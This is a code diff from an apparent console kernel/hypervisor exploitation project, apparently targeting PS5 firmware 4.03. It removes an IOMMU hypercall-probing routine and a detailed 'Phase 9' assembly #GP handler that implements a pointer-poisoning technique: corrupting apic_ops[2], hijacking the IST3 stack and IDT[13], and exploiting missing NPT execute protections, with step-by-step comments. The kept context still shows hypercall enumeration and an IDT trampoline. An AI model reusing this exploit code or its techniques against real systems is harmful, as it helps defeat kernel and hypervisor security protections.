@@ -93,7 +93,7 @@ struct mod_version {
 
 #define RUN_MSR_RECON       1
 #define RUN_VMMCALL_ENUM    1
-#define RUN_VMMCALL_IOMMU   0  /* Enable after confirming enum works */
+/* IOMMU probing removed — speculative, disabled by default */
 
 /* ============================================================
  * Shared data structures (must match main.c definitions)
@@ -157,7 +157,6 @@ struct kmod_result_buf hv_results = { .magic = 0x1 };
  * offset 0 in .text — the kmod scanner depends on this!) */
 extern volatile uint64_t g_trampoline_target;
 int trampoline_xapic_mode(void);
-void gp_handler(void);
 
 /* ============================================================
  * Inline assembly helpers - ring 0 hardware access
@@ -326,37 +325,6 @@ static void campaign_vmmcall_enum(void) {
 }
 #endif
 
-/* ============================================================
- * Campaign: IOMMU Hypercall Probing
- *
- * IOMMU hypercalls are likely in RAX range 0x06-0x0C.
- * Probe with various device IDs.
- * ============================================================ */
-
-#if RUN_VMMCALL_IOMMU
-static void campaign_vmmcall_iommu(void) {
-    hv_results.current_campaign = 2;
-
-    static const uint64_t dev_ids[] = { 0, 1, 0x10, 0x100, 0xFFFF };
-    int num_devs = sizeof(dev_ids) / sizeof(dev_ids[0]);
-
-    for (uint64_t hc = 6; hc <= 12 && hv_results.num_results < KMOD_MAX_RESULTS; hc++) {
-        for (int d = 0; d < num_devs && hv_results.num_results < KMOD_MAX_RESULTS; d++) {
-            hv_results.current_probe = (uint32_t)((hc << 16) | d);
-            memory_barrier();
-
-            uint64_t rax_out, rcx_out, rdx_out, rdi_out, rsi_out, r8_out;
-            int ok = do_vmmcall(hc, 0, 0, dev_ids[d], 0, 0,
-                                &rax_out, &rcx_out, &rdx_out,
-                                &rdi_out, &rsi_out, &r8_out);
-
-            store_result(2, hc, 0, 0, dev_ids[d], 0, 0,
-                         rax_out, rcx_out, rdx_out,
-                         rdi_out, rsi_out, r8_out, ok);
-        }
-    }
-}
-#endif
 
 /* ============================================================
  * Module init - called by kernel linker during kldload
@@ -407,10 +375,6 @@ static void hv_init(const void *arg __attribute__((unused))) {
     campaign_vmmcall_enum();
 #endif
 
-    /* IOMMU probing - more targeted, slightly riskier */
-#if RUN_VMMCALL_IOMMU
-    campaign_vmmcall_iommu();
-#endif
 
     /* Record trampoline addresses for Phase 7.
      *
@@ -425,8 +389,7 @@ static void hv_init(const void *arg __attribute__((unused))) {
         hv_results.trampoline_func_kva = addr;
         __asm__ volatile("lea g_trampoline_target(%%rip), %0" : "=r"(addr));
         hv_results.trampoline_target_kva = addr;
-        __asm__ volatile("lea gp_handler(%%rip), %0" : "=r"(addr));
-        hv_results.gp_handler_kva = addr;
+        hv_results.gp_handler_kva = 0;  /* Phase 9 removed */
     }
 
     /* Mark completion */
@@ -571,89 +534,6 @@ void hv_idt_trampoline(void) {
     );
 }
 
-/* ============================================================
- * Phase 9: #GP handler for flatz pointer poisoning method
- *
- * This naked function runs when #GP fires after apic_ops[2]
- * has been poisoned with a non-canonical address (0xdeb7 prefix).
- * It runs on the IST3 stack (redirected to a cave in kdata).
- *
- * The handler lives in KLD module .text, which is in dynamically
- * allocated kernel memory — NPT-executable on FW 4.03 (GMET not
- * enforced until FW 6.50).  This solves the kdata-is-NX problem:
- *   kdata cave: writable but NX under NPT → can't execute
- *   kmod .text: kernel-linker-allocated → NPT allows execution
- *
- * Technique from ps5-kstuff "On offsets" documentation:
- *   - Pointer poisoning: top 16 bits → 0xdeb7 (non-canonical)
- *   - #GP fires on call through poisoned pointer
- *   - Handler restores everything, iretq re-executes the call
- *
- * The handler restores THREE things (order matters!):
- *   1. IDT[13] — original #GP handler (from cave backup via DMAP)
- *   2. IST3 — original interrupt stack (via DMAP)
- *   3. apic_ops[2] — original xapic_mode pointer (via DMAP) — LAST
- *
- * apic_ops[2] restore is done LAST so rax ends up holding the valid
- * xapic_mode pointer.  The faulting instruction is 'call rax' with
- * the poisoned non-canonical value.  We skip 'pop rax' and instead
- * add $16 to skip both saved rax and error code.  When IRETQ
- * re-executes the faulting 'call rax', rax = valid pointer → success.
- *
- * NOTE: No ktext reads — ktext is XOM under NPT during normal
- * operation.  Reading ktext would cause #NPF → crash.  The ktext
- * read proof is deferred to a future resume-specific handler.
- *
- * The 6 movabs immediates are patched at runtime by userland
- * via DMAP before the pointer is poisoned.  Each has a unique
- * magic value (0xDEAD000000000001-6) that userland locates
- * and replaces with the actual runtime address/value.
- * ============================================================ */
-
-__attribute__((naked, used, aligned(16)))
-void gp_handler(void) {
-    __asm__ volatile(
-        "push %%rax\n"
-        "push %%rcx\n"
-        "push %%rsi\n"
-        "push %%rdi\n"
-        "cld\n"
-
-        /* 1. Restore IDT[13]: 16 bytes from cave backup → IDT */
-        "movabs $0xDEAD000000000001, %%rsi\n"   /* IDT backup source (DMAP) */
-        "movabs $0xDEAD000000000002, %%rdi\n"   /* IDT[13] destination (DMAP) */
-        "mov $16, %%ecx\n"
-        "rep movsb\n"
-
-        /* 2. Restore IST3 on CPU 0 (before apic_ops so rax ends up valid).
-         *    Arming patches IST3 on ALL 16 CPUs — this only restores CPU 0.
-         *    Other CPUs keep cave_stack in IST3, but that's harmless: once
-         *    IDT[13] is restored (step 1), the original #GP handler uses
-         *    IST=0, so IST3 is never consulted for future #GP exceptions. */
-        "movabs $0xDEAD000000000005, %%rax\n"   /* original IST3 VALUE */
-        "movabs $0xDEAD000000000006, %%rdi\n"   /* IST3 CPU 0 (DMAP) */
-        "mov %%rax, (%%rdi)\n"
-
-        /* 3. Restore apic_ops[2] LAST — leaves rax = valid xapic_mode ptr.
-         *    The faulting instruction is 'call rax' with the poisoned
-         *    non-canonical value.  After IRETQ resumes at the CALL,
-         *    rax must hold the valid pointer so the call succeeds.
-         *    If the call is 'call [mem]' instead, the re-read from
-         *    the restored apic_ops[2] also succeeds — rax is harmless. */
-        "movabs $0xDEAD000000000003, %%rax\n"   /* original xapic_mode VALUE */
-        "movabs $0xDEAD000000000004, %%rdi\n"   /* apic_ops[2] (DMAP) */
-        "mov %%rax, (%%rdi)\n"
-
-        "pop %%rdi\n"
-        "pop %%rsi\n"
-        "pop %%rcx\n"
-        /* Skip pop rax — keep rax = valid xapic_mode pointer.
-         * The faulting 'call rax' re-executes with the correct value. */
-        "add $16, %%rsp\n"      /* skip saved rax (8) + error code (8) */
-        "iretq\n"
-        ::: "memory"
-    );
-}
 
 /* ============================================================
  * Phase 7: apic_ops trampoline
